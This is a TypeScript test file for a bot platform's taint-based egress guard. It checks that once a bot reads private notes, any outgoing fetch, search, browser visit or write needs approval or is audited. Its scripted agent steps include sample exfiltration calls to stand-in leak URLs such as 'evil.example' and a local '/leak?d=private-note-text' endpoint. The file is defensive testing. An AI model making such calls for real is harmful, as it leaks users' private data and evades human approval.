import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterEach, describe, expect, it } from 'vitest';
import type { AppConnectFlowPayload, Approval, Run } from '@kepcup/shared';
import {
  createFakeBrowserHost,
  createTestStack,
  listRuns,
  makeBot,
  makeGroup,
  openDirect,
  sendBatch,
  sendDrafts,
  simulateBrowser,
  startFakeOAuthMcpServer,
  step,
  viaTask,
  waitFor,
  type FakeMcpTool,
  type FakeOAuthMcpServer,
  type TestStack,
} from '@kepcup/testkit';

import { ConnectorCatalog } from '../../src/apps/catalog.js';
import { fakeCatalogEntry, until } from '../support/catalog-connect-env.js';

/**
 * D73 P2 §6.2 污点外发控制（design 29 §8.3），假服务 + 真 core：
 *
 * 读取应用数据（`list_notes`）→ (Bot, 对话) 进入污点 → web_fetch / web_search / 浏览器导航 /
 * 非只读应用工具（即使策略是 auto）弹 `egress` 卡（外发内容全文，只有「允许一次」）；
 * `runs.retry` 与后续任务沿用同一污点；别的对话不受影响；关闭开关后不弹；无人值守自动批准
 * 但审计 `egress_tainted` 并汇总到 Bot 详情（`apps.egressSummary`）。24 小时过期与各通道细节
 * 见 `unit/taint-egress.test.ts`。
 */

const cleanups: Array<() => Promise<void> | void> = [];
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup();
});

async function freePorts(count: number): Promise<number[]> {
  const holders: Server[] = [];
  const ports: number[] = [];
  for (let i = 0; i < count; i += 1) {
    const server = createServer();
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    holders.push(server);
    ports.push((server.address() as AddressInfo).port);
  }
  await Promise.all(holders.map((s) => new Promise<void>((r) => s.close(() => r()))));
  return ports;
}

const TOOLS: FakeMcpTool[] = [
  { name: 'list_notes', description: 'List notes', annotations: { readOnlyHint: true } },
  {
    name: 'create_note',
    description: 'Create a note',
    annotations: { readOnlyHint: false, destructiveHint: false },
  },
  // No per-tool policy in the tests: it asks by default (the ordinary mcp_tool card).
  {
    name: 'update_note',
    description: 'Update a note',
    annotations: { readOnlyHint: false, destructiveHint: false },
  },
];
const ACCOUNT = { sub: 'acct-1', email: 'jyy@example.com' };
const TERMINAL = new Set(['done', 'failed', 'cancelled']);

interface Env {
  stack: TestStack;
  core: TestStack['core'];
  llm: TestStack['llm'];
  fake: FakeOAuthMcpServer;
  browser: ReturnType<typeof createFakeBrowserHost>;
  flowEvents: AppConnectFlowPayload[];
  call(method: string, input?: unknown): Promise<unknown>;
}

async function start(): Promise<Env> {
  const fake = await startFakeOAuthMcpServer({ dcrEnabled: true, tools: TOOLS });
  cleanups.push(() => fake.stop());
  const catalog = new ConnectorCatalog({
    env: {},
    source: {
      entries: [fakeCatalogEntry({ slug: 'notes', title: 'Notes', url: fake.mcpUrl })],
      iconsDir: null,
    },
    approvedGates: null,
  });
  const browser = createFakeBrowserHost();
  browser.setSnapshot({
    title: 'T',
    url: 'https://x.example/',
    elements: [
      { ref: 'e1', role: 'textbox', name: '备注' },
      { ref: 'e2', role: 'button', name: '提交' },
    ],
    elementsTruncated: false,
    text: '正文',
    textTruncated: false,
  });
  const stack = await createTestStack({
    connectorCatalog: catalog,
    browserRpc: browser,
    shellRpc: {
      async openExternal({ url }) {
        void simulateBrowser(url).catch(() => undefined);
        return { ok: true };
      },
    },
    oauthLoopbackAllowlist: ['127.0.0.1'],
    oauthCallbackPorts: await freePorts(3),
    oauthFlowTimeoutMs: 20_000,
    toolLockTrustFirstList: false,
  });
  cleanups.push(() => stack.cleanup());
  const { core } = stack;
  fake.configure({ idTokenClaims: { ...ACCOUNT } });
  const flowEvents: AppConnectFlowPayload[] = [];
  core.onEvent('apps.connect_flow', (payload) => {
    flowEvents.push(payload);
    if (payload.phase === 'awaiting_consent') {
      void core.rpc.call('apps.connect.continue', { flowId: payload.flowId });
    }
  });
  return {
    stack,
    core,
    llm: stack.llm,
    fake,
    browser,
    flowEvents,
    call: (method, input) => core.rpc.call(method as never, input as never),
  };
}

async function connectApp(env: Env, grantBotId: string): Promise<string> {
  const { flowId } = (await env.call('apps.connect', {
    target: { kind: 'catalog', connectorId: 'notes' },
    grantBotId,
  })) as { flowId: string };
  const mine = () => env.flowEvents.filter((e) => e.flowId === flowId);
  const first = await until(
    () => mine().find((e) => e.phase === 'reviewing_tools' || TERMINAL.has(e.phase)),
    20_000,
    'reviewing_tools or terminal',
  );
  if (first.phase === 'reviewing_tools') await env.call('apps.connect.confirmTools', { flowId });
  const done = await until(() => mine().find((e) => TERMINAL.has(e.phase)), 20_000, 'done');
  expect(done.phase).toBe('done');
  return done.connectionId!;
}

async function nextTask(
  env: Env,
  conversationId: string,
  status: Run['status'],
  seen: Set<string>,
): Promise<Run> {
  const run = await waitFor(
    async () =>
      (await listRuns(env.core, conversationId)).find(
        (r) => r.loopType === 'task' && r.status === status && !seen.has(r.id),
      ) ?? null,
    { label: `task ${status}`, timeoutMs: 60_000 },
  );
  seen.add(run.id);
  return run;
}

async function egressCards(env: Env, conversationId: string): Promise<Approval[]> {
  return (
    (await env.call('approvals.list', { conversationId })) as { approvals: Approval[] }
  ).approvals.filter((a) => a.kind === 'egress');
}

async function pendingEgress(env: Env, conversationId: string, channel: string): Promise<Approval> {
  return waitFor(
    async () =>
      (await egressCards(env, conversationId)).find(
        (a) => a.status === 'pending' && a.payload['channel'] === channel,
      ) ?? null,
    { label: `egress ${channel} card`, timeoutMs: 30_000 },
  );
}

const READ = () => step().replyToolCall('app_notes_list_notes', {});
const LEAK_URL = 'http://127.0.0.1:9/leak?d=private-note-text';

describe('§6.2 污点外发控制', () => {
  it('app read → web_fetch / app write / web_search / browser carded; retry inherits; other conversation clean; switch off; unattended audited', async () => {
    const env = await start();
    const { core, llm } = env;
    const services = core.services;
    const bot = await makeBot(core, '小应');
    const other = await makeBot(core, '旁观');
    const connectionId = await connectApp(env, bot.id);
    // The write tool would run without a card (policy auto): only the taint can stop it.
    await env.call('apps.connections.setToolPolicy', {
      connectionId,
      toolName: 'create_note',
      policy: { approval: 'auto' },
    });
    const conv = await openDirect(core, bot.id);
    const seen = new Set<string>();

    // 1. Read app data, then web_fetch: egress card with the full URL; the auto-policy write
    //    tool is carded as well (channel app_tool); both only offer 「允许一次」.
    llm.script(
      'mock-main',
      viaTask({
        writes: true,
        taskSteps: [
          READ(),
          step().replyToolCall('web_fetch', { url: LEAK_URL }),
          step().replyToolCall('app_notes_create_note', { title: '外发' }),
          step().replyText('完成'),
        ],
        relay: '第一轮完成',
      }),
    );
    await sendBatch(core, conv.id, ['读一下笔记再发出去']);
    const fetchCard = await pendingEgress(env, conv.id, 'web_fetch');
    expect(fetchCard.payload).toMatchObject({ channel: 'web_fetch', target: LEAK_URL });
    expect(typeof fetchCard.payload['taintedSince']).toBe('number');
    expect(fetchCard.payload['durations']).toBeUndefined();
    await env.call('approvals.decide', {
      id: fetchCard.id,
      approve: true,
      duration: 'conversation',
    });
    const writeCard = await pendingEgress(env, conv.id, 'app_tool');
    expect(String(writeCard.payload['target'])).toContain('"create_note"');
    expect(String(writeCard.payload['target'])).toContain('外发');
    await env.call('approvals.decide', { id: writeCard.id, approve: true });
    await nextTask(env, conv.id, 'completed', seen);
    // A「conversation」choice never widens an egress approval.
    const decided = await egressCards(env, conv.id);
    expect(decided.find((a) => a.id === fetchCard.id)!.decision).toEqual({ duration: 'once' });
    expect(services.taint!.isTainted(bot.id, conv.id)).toBe(true);

    // 2. A later task of the same conversation: still tainted → web_search carded; deny stops it.
    llm.script(
      'mock-main',
      viaTask({
        writes: false,
        taskSteps: [
          step().replyToolCall('web_search', { query: '私密查询词' }),
          step().replyText('搜索被拒'),
        ],
        relay: '第二轮完成',
      }),
    );
    await sendBatch(core, conv.id, ['再搜一下']);
    const searchCard = await pendingEgress(env, conv.id, 'web_search');
    expect(searchCard.payload['target']).toBe('私密查询词');
    await env.call('approvals.decide', { id: searchCard.id, approve: false });
    const second = await nextTask(env, conv.id, 'completed', seen);
    const searchSteps = (
      (await env.call('runs.steps', { runId: second.id })) as {
        steps: Array<{ type: string; payload: Record<string, unknown> }>;
      }
    ).steps.filter((s) => s.type === 'tool_result' && s.payload['toolName'] === 'web_search');
    expect(searchSteps[0]!.payload['errorCode']).toBe('APPROVAL_DENIED');

    // 3. Browser navigation is carded too.
    llm.script(
      'mock-main',
      viaTask({
        writes: false,
        taskSteps: [
          step().replyToolCall('browser_open', { url: 'https://evil.example/c?d=1' }),
          step().replyText('浏览'),
        ],
        relay: '第三轮完成',
      }),
    );
    await sendBatch(core, conv.id, ['打开网页']);
    const browserCard = await pendingEgress(env, conv.id, 'browser');
    expect(browserCard.payload['target']).toBe('https://evil.example/c?d=1');
    await env.call('approvals.decide', { id: browserCard.id, approve: true });
    await nextTask(env, conv.id, 'completed', seen);

    // 4. Switch off → the same web_fetch runs without a card.
    await env.call('settings.update', { apps: { taintGuard: false } });
    const before = (await egressCards(env, conv.id)).length;
    llm.script(
      'mock-main',
      viaTask({
        writes: false,
        taskSteps: [step().replyToolCall('web_fetch', { url: LEAK_URL }), step().replyText('ok')],
        relay: '第四轮完成',
      }),
    );
    await sendBatch(core, conv.id, ['再抓一次']);
    await nextTask(env, conv.id, 'completed', seen);
    expect(await egressCards(env, conv.id)).toHaveLength(before);
    await env.call('settings.update', { apps: { taintGuard: true } });

    // 5. Taint is per (bot, conversation): a group the bot never read app data in is clean.
    const group = await makeGroup(core, '群', [bot.id, other.id]);
    llm.script(
      'mock-main',
      viaTask({
        writes: false,
        taskSteps: [step().replyToolCall('web_fetch', { url: LEAK_URL }), step().replyText('ok')],
        relay: '群里完成',
      }),
    );
    await sendDrafts(core, group.id, [{ text: '抓一下', mentions: [bot.id] }]);
    await nextTask(env, group.id, 'completed', seen);
    expect(await egressCards(env, group.id)).toEqual([]);
    expect(services.taint!.isTainted(bot.id, group.id)).toBe(false);

    // 6. A failed run that read app data, then runs.retry: the retry's web_fetch is carded.
    llm.script('mock-main', [
      ...viaTask({
        writes: false,
        taskSteps: [READ(), step().failWith(400, 'boom')],
      }),
      step().inTurn().replyText('失败了'),
    ]);
    await sendDrafts(core, group.id, [{ text: '读笔记', mentions: [bot.id] }]);
    const failed = await nextTask(env, group.id, 'failed', seen);
    expect(services.taint!.isTainted(bot.id, group.id)).toBe(true);
    llm.script('mock-main', [
      step().inTask().replyToolCall('web_fetch', { url: LEAK_URL }),
      step().inTask().replyText('重试完成'),
      step().inTurn().replyText('重试后转述'),
    ]);
    await env.call('runs.retry', { runId: failed.id });
    const retryCard = await pendingEgress(env, group.id, 'web_fetch');
    expect(retryCard.payload['target']).toBe(LEAK_URL);
    await env.call('approvals.decide', { id: retryCard.id, approve: false });
    await waitFor(
      async () =>
        (await listRuns(core, group.id)).find(
          (r) => r.loopType === 'task' && r.status === 'completed' && !seen.has(r.id),
        ) ?? null,
      { label: 'retried task completed', timeoutMs: 60_000 },
    );

    // 7. Unattended: auto-approved (no waiting), audited as egress_tainted, summarised per bot.
    await env.call('unattended.enable', { hours: null, acknowledgeRisk: true });
    llm.script(
      'mock-main',
      viaTask({
        writes: true,
        taskSteps: [
          step().replyToolCall('web_fetch', { url: LEAK_URL }),
          step().replyToolCall('app_notes_create_note', { title: '无人值守' }),
          step().replyToolCall('app_notes_update_note', { id: 'n1', title: '改名' }),
          step().replyText('ok'),
        ],
        relay: '无人值守完成',
      }),
    );
    await sendBatch(core, conv.id, ['无人值守外发']);
    await nextTask(env, conv.id, 'completed', seen);
    const autos = (await egressCards(env, conv.id)).filter((a) => a.autoApproved);
    expect(autos).toHaveLength(2);
    // web_fetch + the auto-policy write (egress cards) ...
    expect(autos.map((a) => a.payload['channel']).sort()).toEqual(['app_tool', 'web_fetch']);
    expect(autos.every((a) => a.status === 'approved')).toBe(true);
    // ... and update_note, which asks anyway: its ordinary mcp_tool card is the tainted one.
    const autoMcp = (
      (await env.call('approvals.list', { conversationId: conv.id })) as { approvals: Approval[] }
    ).approvals.filter(
      (a) => a.kind === 'mcp_tool' && a.autoApproved && a.payload['toolName'] === 'update_note',
    );
    expect(autoMcp).toHaveLength(1);
    expect(autoMcp[0]!.payload).toMatchObject({ tainted: true });
    const audited = services
      .domain!.audit.listByConversation(conv.id, 200)
      .filter((a) => a.action === 'egress_tainted');
    // The tainted mcp_tool approval is audited as an app_tool channel with the tool + full args.
    expect(audited.map((a) => a.detail['channel']).sort()).toEqual([
      'app_tool',
      'app_tool',
      'web_fetch',
    ]);
    const updateAudit = audited.find((a) => String(a.detail['target']).startsWith('update_note'))!;
    expect(updateAudit.detail).toMatchObject({
      kind: 'mcp_tool',
      channel: 'app_tool',
      approved: true,
    });
    expect(String(updateAudit.detail['target'])).toContain('改名');
    expect(audited.find((a) => a.detail['channel'] === 'web_fetch')!.detail).toMatchObject({
      target: LEAK_URL,
      approved: true,
      via: 'unattended',
    });
    const summary = (await env.call('apps.egressSummary', { botId: bot.id })) as {
      total: number;
      recent: Array<{ channel: string; target: string }>;
    };
    expect(summary.total).toBe(3);
    expect(summary.recent.map((r) => r.channel).sort()).toEqual([
      'app_tool',
      'app_tool',
      'web_fetch',
    ]);
    expect(
      ((await env.call('apps.egressSummary', { botId: other.id })) as { total: number }).total,
    ).toBe(0);
  }, 300_000);

  it('identical tainted browser clicks in one task chain are plain per-call cards (no dedupe flag), and unattended still auto-approves them', async () => {
    const env = await start();
    const { core, llm } = env;
    const bot = await makeBot(core, '小应');
    await connectApp(env, bot.id);
    const conv = await openDirect(core, bot.id);
    const seen = new Set<string>();
    const click = () => step().replyToolCall('browser_click', { ref: 'e2' });

    llm.script(
      'mock-main',
      viaTask({
        writes: false,
        taskSteps: [
          READ(),
          step().replyToolCall('browser_open', { url: 'https://x.example/' }),
          click(),
          click(),
          step().replyText('点了两次'),
        ],
        relay: '浏览完成',
      }),
    );
    await sendBatch(core, conv.id, ['读完笔记去网页提交']);
    const decided = new Set<string>();
    for (let i = 0; i < 3; i += 1) {
      const card = await waitFor(
        async () =>
          (await egressCards(env, conv.id)).find(
            (a) =>
              a.status === 'pending' && a.payload['channel'] === 'browser' && !decided.has(a.id),
          ) ?? null,
        { label: `browser card ${i + 1}`, timeoutMs: 30_000 },
      );
      // The second identical click would have carried a「prior effect」flag before.
      expect(card.payload['priorEffect'], `card ${i + 1}`).toBeUndefined();
      decided.add(card.id);
      await env.call('approvals.decide', { id: card.id, approve: true });
    }
    await nextTask(env, conv.id, 'completed', seen);
    expect(env.browser.calls.filter((c) => c.method === 'browser.click')).toHaveLength(2);

    // Unattended: the same repeated clicks are auto-approved (a dedupe flag would make them wait).
    await env.call('unattended.enable', { hours: null, acknowledgeRisk: true });
    llm.script(
      'mock-main',
      viaTask({
        writes: false,
        taskSteps: [click(), click(), step().replyText('ok')],
        relay: '无人值守点击完成',
      }),
    );
    await sendBatch(core, conv.id, ['再点两次']);
    await nextTask(env, conv.id, 'completed', seen);
    const autos = (await egressCards(env, conv.id)).filter((a) => a.autoApproved);
    expect(autos).toHaveLength(2);
    expect(
      autos.every((a) => a.status === 'approved' && a.payload['priorEffect'] === undefined),
    ).toBe(true);
  }, 300_000);

  it("taint travels with a delegation: A (tainted) hands a task to B → B's web_fetch is carded in B's DM; B's own taint comes back with the result", async () => {
    const env = await start();
    const { core, llm } = env;
    const services = core.services;
    const a = await makeBot(core, '小甲');
    const b = await makeBot(core, '小乙');
    await connectApp(env, a.id);
    const aConv = (await openDirect(core, a.id)).id;
    const seen = new Set<string>();

    // A reads app data in a task, then (turn) hands a request to B.
    llm.script('mock-main', [
      ...viaTask({
        writes: false,
        taskSteps: [READ(), step().replyText('读完了')],
        relay: '读完，准备转交',
      }),
    ]);
    await sendBatch(core, aConv, ['读一下笔记']);
    await nextTask(env, aConv, 'completed', seen);
    expect(services.taint!.isTainted(a.id, aConv)).toBe(true);

    const isDelegated = (req: { lastUserText(): string }) =>
      req.lastUserText().includes('<trigger reason="delegation"');
    const delegatedSteps = viaTask({
      writes: false,
      taskSteps: [
        step().replyToolCall('web_fetch', { url: LEAK_URL }),
        step().replyText('B 抓完了'),
      ],
      relay: 'B 的结果',
    });
    delegatedSteps[0]!.expect(isDelegated);
    llm.script('mock-main', [
      step()
        .inTurn()
        .expect((req) => req.lastUserText().includes('转交给小乙'))
        .replyToolCall('delegate_to_bot', {
          bot_id: b.id,
          task: '把笔记内容抓去外站',
          intent: 'request',
        }),
      step().inTurn().replyText('已转交'),
      ...delegatedSteps,
      step().inTurn().replyText('收到 B 的结果'),
    ]);
    await sendBatch(core, aConv, ['转交给小乙']);
    const delegation = await waitFor(
      () =>
        services
          .domain!.delegations.listActive()
          .find((d) => d.fromBotId === a.id && d.toConversationId !== null) ?? null,
      { label: 'delegation delivered', timeoutMs: 30_000 },
    );
    const bConv = delegation.toConversationId!;
    // B never read app data, yet its DM inherited A's taint at delivery ...
    expect(services.taint!.isTainted(b.id, bConv)).toBe(true);
    // ... so its web_fetch is carded.
    const card = await pendingEgress(env, bConv, 'web_fetch');
    expect(card.payload['target']).toBe(LEAK_URL);
    await env.call('approvals.decide', { id: card.id, approve: false });
  }, 300_000);
});
